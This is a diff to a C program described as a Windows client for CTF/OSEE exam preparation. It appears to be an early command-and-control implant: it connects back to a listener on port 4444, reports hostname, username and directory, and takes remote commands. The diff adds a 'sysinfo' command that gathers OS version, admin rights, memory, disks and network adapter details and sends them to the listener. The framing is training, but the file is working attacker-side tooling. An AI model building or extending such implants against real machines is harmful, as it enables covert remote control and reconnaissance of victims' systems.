@@ -1,6 +1,6 @@
 /*
- * Windows Client for CTF/OSEE Preparation - File Browser
- * Compile on Linux: x86_64-w64-mingw32-gcc -o client.exe client.c -lws2_32 -static
+ * Windows Client for CTF/OSEE Preparation - Version 3
+ * Compile on Linux: x86_64-w64-mingw32-gcc -o client.exe client.c -lws2_32 -liphlpapi -static
  * Usage: client.exe <listener_ip> [port]
  */
 
@@ -10,9 +10,209 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <direct.h>
+#include <iphlpapi.h>
+#include <ws2tcpip.h>
 
-#define BUFFER_SIZE 8192
+#pragma comment(lib, "iphlpapi.lib")
+
+#define BUFFER_SIZE 16384
 #define DEFAULT_PORT 4444
+
+void get_os_info(char *output, size_t size) {
+    OSVERSIONINFOEX osvi;
+    SYSTEM_INFO si;
+    char temp[512];
+    
+    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
+    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
+    
+    strcat(output, "=== OS Information ===\n");
+    
+    #pragma GCC diagnostic push
+    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
+    if (GetVersionEx((OSVERSIONINFO*)&osvi)) {
+        snprintf(temp, sizeof(temp), "OS Version: %lu.%lu Build %lu\n",
+                osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
+        strcat(output, temp);
+        
+        if (osvi.szCSDVersion[0] != '\0') {
+            snprintf(temp, sizeof(temp), "Service Pack: %s\n", osvi.szCSDVersion);
+            strcat(output, temp);
+        }
+    }
+    #pragma GCC diagnostic pop
+    
+    GetSystemInfo(&si);
+    snprintf(temp, sizeof(temp), "Processor Architecture: ");
+    strcat(output, temp);
+    
+    switch(si.wProcessorArchitecture) {
+        case PROCESSOR_ARCHITECTURE_AMD64:
+            strcat(output, "x64 (AMD64)\n");
+            break;
+        case PROCESSOR_ARCHITECTURE_INTEL:
+            strcat(output, "x86\n");
+            break;
+        case PROCESSOR_ARCHITECTURE_ARM:
+            strcat(output, "ARM\n");
+            break;
+        default:
+            strcat(output, "Unknown\n");
+    }
+    
+    snprintf(temp, sizeof(temp), "Number of Processors: %lu\n\n", si.dwNumberOfProcessors);
+    strcat(output, temp);
+}
+
+void get_computer_info(char *output, size_t size) {
+    char hostname[256];
+    char username[256];
+    DWORD dsize;
+    char temp[512];
+    
+    strcat(output, "=== Computer Information ===\n");
+    
+    dsize = sizeof(hostname);
+    if (GetComputerNameA(hostname, &dsize)) {
+        snprintf(temp, sizeof(temp), "Computer Name: %s\n", hostname);
+        strcat(output, temp);
+    }
+    
+    dsize = sizeof(username);
+    if (GetUserNameA(username, &dsize)) {
+        snprintf(temp, sizeof(temp), "Username: %s\n", username);
+        strcat(output, temp);
+    }
+    
+    // Check if user is admin
+    BOOL isAdmin = FALSE;
+    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
+    PSID AdministratorsGroup;
+    
+    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
+                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
+                                 &AdministratorsGroup)) {
+        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
+        FreeSid(AdministratorsGroup);
+    }
+    
+    snprintf(temp, sizeof(temp), "Admin Privileges: %s\n\n", isAdmin ? "YES" : "NO");
+    strcat(output, temp);
+}
+
+void get_memory_info(char *output, size_t size) {
+    MEMORYSTATUSEX memInfo;
+    char temp[512];
+    
+    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+    
+    strcat(output, "=== Memory Information ===\n");
+    
+    if (GlobalMemoryStatusEx(&memInfo)) {
+        DWORDLONG totalPhysMB = memInfo.ullTotalPhys / (1024 * 1024);
+        DWORDLONG availPhysMB = memInfo.ullAvailPhys / (1024 * 1024);
+        
+        snprintf(temp, sizeof(temp), "Total Physical Memory: %llu MB\n", totalPhysMB);
+        strcat(output, temp);
+        
+        snprintf(temp, sizeof(temp), "Available Physical Memory: %llu MB\n", availPhysMB);
+        strcat(output, temp);
+        
+        snprintf(temp, sizeof(temp), "Memory Load: %lu%%\n\n", memInfo.dwMemoryLoad);
+        strcat(output, temp);
+    }
+}
+
+void get_disk_info(char *output, size_t size) {
+    char temp[512];
+    DWORD drives = GetLogicalDrives();
+    
+    strcat(output, "=== Disk Information ===\n");
+    
+    for (int i = 0; i < 26; i++) {
+        if (drives & (1 << i)) {
+            char drive[4] = {0};
+            sprintf(drive, "%c:\\", 'A' + i);
+            
+            ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
+            
+            if (GetDiskFreeSpaceExA(drive, &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
+                DWORDLONG totalGB = totalBytes.QuadPart / (1024 * 1024 * 1024);
+                DWORDLONG freeGB = totalFreeBytes.QuadPart / (1024 * 1024 * 1024);
+                
+                snprintf(temp, sizeof(temp), "Drive %s - Total: %llu GB, Free: %llu GB\n",
+                        drive, totalGB, freeGB);
+                strcat(output, temp);
+            }
+        }
+    }
+    strcat(output, "\n");
+}
+
+void get_network_info(char *output, size_t size) {
+    char temp[512];
+    PIP_ADAPTER_INFO pAdapterInfo;
+    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+    
+    strcat(output, "=== Network Information ===\n");
+    
+    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
+    
+    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+        free(pAdapterInfo);
+        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
+    }
+    
+    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
+        
+        while (pAdapter) {
+            snprintf(temp, sizeof(temp), "\nAdapter: %s\n", pAdapter->Description);
+            strcat(output, temp);
+            
+            snprintf(temp, sizeof(temp), "  MAC Address: ");
+            strcat(output, temp);
+            for (UINT i = 0; i < pAdapter->AddressLength; i++) {
+                snprintf(temp, sizeof(temp), "%02X%s", 
+                        pAdapter->Address[i],
+                        (i == pAdapter->AddressLength - 1) ? "\n" : "-");
+                strcat(output, temp);
+            }
+            
+            snprintf(temp, sizeof(temp), "  IP Address: %s\n", 
+                    pAdapter->IpAddressList.IpAddress.String);
+            strcat(output, temp);
+            
+            snprintf(temp, sizeof(temp), "  Gateway: %s\n", 
+                    pAdapter->GatewayList.IpAddress.String);
+            strcat(output, temp);
+            
+            pAdapter = pAdapter->Next;
+        }
+    }
+    
+    if (pAdapterInfo) {
+        free(pAdapterInfo);
+    }
+    
+    strcat(output, "\n");
+}
+
+void get_system_info(char *output, size_t output_size) {
+    memset(output, 0, output_size);
+    
+    strcat(output, "\n");
+    strcat(output, "╔════════════════════════════════════════╗\n");
+    strcat(output, "║     WINDOWS SYSTEM INFORMATION         ║\n");
+    strcat(output, "╚════════════════════════════════════════╝\n");
+    strcat(output, "\n");
+    
+    get_os_info(output, output_size);
+    get_computer_info(output, output_size);
+    get_memory_info(output, output_size);
+    get_disk_info(output, output_size);
+    get_network_info(output, output_size);
+}
 
 void get_directory_listing(char *output, size_t output_size) {
     WIN32_FIND_DATA findData;
@@ -23,7 +223,6 @@ void get_directory_listing(char *output, size_t output_size) {
     
     memset(output, 0, output_size);
     
-    // Get current directory
     if (_getcwd(cwd, sizeof(cwd)) == NULL) {
         snprintf(output, output_size, "[-] Failed to get current directory\n");
         return;
@@ -31,7 +230,6 @@ void get_directory_listing(char *output, size_t output_size) {
     
     snprintf(output, output_size, "\nDirectory: %s\n\n", cwd);
     
-    // Search for all files
     snprintf(search_path, sizeof(search_path), "%s\\*", cwd);
     hFind = FindFirstFile(search_path, &findData);
     
@@ -60,20 +258,19 @@ void get_directory_listing(char *output, size_t output_size) {
 void handle_command(char *cmd, char *output, size_t output_size) {
     char *trimmed_cmd = cmd;
     
-    // Trim whitespace
     while (*trimmed_cmd == ' ' || *trimmed_cmd == '\t') {
         trimmed_cmd++;
     }
     
-    // Handle 'dir' command
-    if (strncmp(trimmed_cmd, "dir", 3) == 0) {
+    if (strcmp(trimmed_cmd, "sysinfo") == 0) {
+        get_system_info(output, output_size);
+    }
+    else if (strncmp(trimmed_cmd, "dir", 3) == 0) {
         get_directory_listing(output, output_size);
     }
-    // Handle 'cd' command
     else if (strncmp(trimmed_cmd, "cd ", 3) == 0) {
         char *path = trimmed_cmd + 3;
         
-        // Trim leading spaces from path
         while (*path == ' ' || *path == '\t') {
             path++;
         }
@@ -86,7 +283,6 @@ void handle_command(char *cmd, char *output, size_t output_size) {
             snprintf(output, output_size, "[-] Failed to change directory to: %s\n", path);
         }
     }
-    // Handle 'pwd' command
     else if (strcmp(trimmed_cmd, "pwd") == 0) {
         char cwd[MAX_PATH];
         if (_getcwd(cwd, sizeof(cwd)) != NULL) {
@@ -96,7 +292,7 @@ void handle_command(char *cmd, char *output, size_t output_size) {
         }
     }
     else {
-        snprintf(output, output_size, "[-] Unknown command. Supported: dir, cd <path>, pwd\n");
+        snprintf(output, output_size, "[-] Unknown command: %s\n", trimmed_cmd);
     }
 }
 
@@ -112,13 +308,11 @@ int connect_to_listener(const char *host, int port) {
     DWORD size;
     int bytes_received;
     
-    // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
         printf("[-] WSAStartup failed: %d\n", WSAGetLastError());
         return 1;
     }
     
-    // Create socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
         printf("[-] Socket creation failed: %d\n", WSAGetLastError());
@@ -126,14 +320,12 @@ int connect_to_listener(const char *host, int port) {
         return 1;
     }
     
-    // Configure server address
     server.sin_family = AF_INET;
     server.sin_port = htons(port);
     server.sin_addr.s_addr = inet_addr(host);
     
     printf("[*] Connecting to %s:%d...\n", host, port);
     
-    // Connect to listener
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
         printf("[-] Connection failed: %d\n", WSAGetLastError());
         closesocket(sock);
@@ -143,7 +335,6 @@ int connect_to_listener(const char *host, int port) {
     
     printf("[+] Connected to listener\n");
     
-    // Receive welcome message
     memset(buffer, 0, BUFFER_SIZE);
     bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
     if (bytes_received > 0) {
@@ -151,7 +342,6 @@ int connect_to_listener(const char *host, int port) {
         printf("%s", buffer);
     }
     
-    // Send connection info
     size = sizeof(hostname);
     GetComputerNameA(hostname, &size);
     size = sizeof(username);
@@ -161,7 +351,6 @@ int connect_to_listener(const char *host, int port) {
     snprintf(buffer, BUFFER_SIZE, "[+] %s\\%s @ %s", hostname, username, cwd);
     send(sock, buffer, strlen(buffer), 0);
     
-    // Command loop
     while (1) {
         memset(buffer, 0, BUFFER_SIZE);
         bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
@@ -172,21 +361,18 @@ int connect_to_listener(const char *host, int port) {
         }
         
         buffer[bytes_received] = '\0';
-        
-        // Remove newline
         buffer[strcspn(buffer, "\r\n")] = 0;
         
-        // Check for exit command
         if (strcmp(buffer, "exit") == 0 || strcmp(buffer, "quit") == 0) {
             printf("[*] Exit command received\n");
             break;
         }
         
-        // Handle command
         handle_command(buffer, output, sizeof(output));
         
-        // Send output back
+        // Send output with end marker
         send(sock, output, strlen(output), 0);
+        send(sock, "<<<END>>>", 9, 0);
     }
     
     closesocket(sock);
@@ -210,10 +396,10 @@ int main(int argc, char *argv[]) {
     }
     
     printf("========================================\n");
-    printf("Windows Client - File Browser\n");
+    printf("Windows Client - Version 3\n");
+    printf("File Browser + System Info\n");
     printf("========================================\n");
     
-    // Retry loop
     while (1) {
         if (connect_to_listener(host, port) == 0) {
             break;
